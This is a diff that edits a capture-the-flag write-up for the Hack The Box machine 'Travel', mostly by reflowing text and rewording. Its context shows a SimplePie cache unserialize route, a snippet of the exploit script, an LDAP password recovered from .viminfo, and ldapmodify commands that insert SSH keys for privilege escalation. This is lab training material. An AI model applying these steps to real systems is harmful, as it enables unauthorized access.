@@ -41,7 +41,8 @@ This gives use three hostnames to work with on the web server, perhaps there are
 Accessing any of the alternative names results in a page that states:
 
 ```
-We are currently sorting out how to get SSL implemented with multiple domains properly. Also we are experiencing severe performance problems on SSL still.
+We are currently sorting out how to get SSL implemented with multiple domains properly. Also we are
+experiencing severe performance problems on SSL still.
 
 In the meantime please use our non-SSL websites.
 
@@ -312,7 +313,12 @@ If we [search the wordpress git repo for 'unserialize'](https://github.com/WordP
 		{
 			$data = $data->data;
 		}
-		return $this->cache->set($this->name, serialize($data), MEMCACHE_COMPRESSED, (int) $this->options['extras']['timeout']);
+		return $this->cache->set(
+      $this->name,
+      serialize($data),
+      MEMCACHE_COMPRESSED,
+      (int) $this->options['extras']['timeout']
+    );
   }
 
   	/**
@@ -355,7 +361,8 @@ call to set the cache value. In the constructor in the same file we find:
 				'prefix' => 'simplepie_',
 			),
 		);
-		$this->options = SimplePie_Misc::array_merge_recursive($this->options, SimplePie_Cache::parse_URL($location));
+    $this->options = SimplePie_Misc::array_merge_recursive($this->options,
+      SimplePie_Cache::parse_URL($location));
 
 		$this->name = $this->options['extras']['prefix'] . md5("$name:$type");
 
@@ -388,7 +395,8 @@ If we look at the `init` function in `class-simplepi.php` we find the call to ge
     if ($this->cache && $parsed_feed_url['scheme'] !== '')
     {
       $url = $this->feed_url . ($this->force_feed ? '#force_feed' : '');
-      $cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
+      $cache = $this->registry->call('Cache', 'get_handler',
+        array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
     }
 
     // Fetch the data via SimplePie_File into $this->raw_data
@@ -537,7 +545,7 @@ CLEAR="\e[m"
 htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
 echo "htb ip ${htbip}"
 
-# Doesn't really matter what this, as long as its consistent, but if you've got your own
+# Doesn't really matter what this is, as long as its consistent, but if you've got your own
 # server running you can verify it's being hit
 feed_url="http://${htbip}/feed.html"
 
@@ -726,7 +734,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.02 seconds
 
 #### Home directory
 
-In `.ldaprc`:
+We find information about the domain in `.ldaprc`:
 
 ```
 HOST ldap.travel.htb
@@ -734,7 +742,7 @@ BASE dc=travel,dc=htb
 BINDDN cn=lynik-admin,dc=travel,dc=htb
 ```
 
-In `.viminfo`:
+We find the password for the ldap server in `.viminfo`:
 
 ```
 # Registers:
@@ -749,7 +757,7 @@ In `.viminfo`:
 
 ### ldap.travel.htb
 
-Searching...
+Lets connect to the ldap server and see what we can find...
 
 ```shell
 lynik-admin@travel:~$ ldapsearch -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x -b 'dc=travel,dc=htb'
@@ -937,9 +945,10 @@ Success! The home directory looks different than usual. Let's add in a public ke
 
 ### trvl-admin enum
 
-After running some enum, and looking at what `trvl-admin` has access to that `lynik-admin` doesn't, there's not an obvious route to root. The most obvious route
-seems to be using `sudo`, and there's a `.sudo_as_admin_as_successful` file in the `trvl-admin` home directory. However, we don't have the password. We do,
-however, have the password for `lynik-admin`. What if we could login via ldap as `lynik-admin`, but with a `gidNumber` for the `sudo` group. Let's try it.
+After running some enum, and looking at what `trvl-admin` has access to that `lynik-admin` doesn't, there's not an obvious route to root. The most
+obvious route seems to be using `sudo`, and there's a `.sudo_as_admin_as_successful` file in the `trvl-admin` home directory. However, we don't have the 
+password. We do, however, have the password for `lynik-admin`. What if we could login via ldap as `lynik-admin`, but with a `gidNumber` for the `sudo` 
+group. Let's try it.
 
 ### Owning Root
 
@@ -970,7 +979,7 @@ replace: sshPublicKey
 sshPublicKey: ${ssh_public_key}" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x
 ```
 
-And now let's SSH in as `jane`.
+And now let's SSH in as `'jane'`.
 
 ```shell
 ╭─zoey@virtual-parrot ~
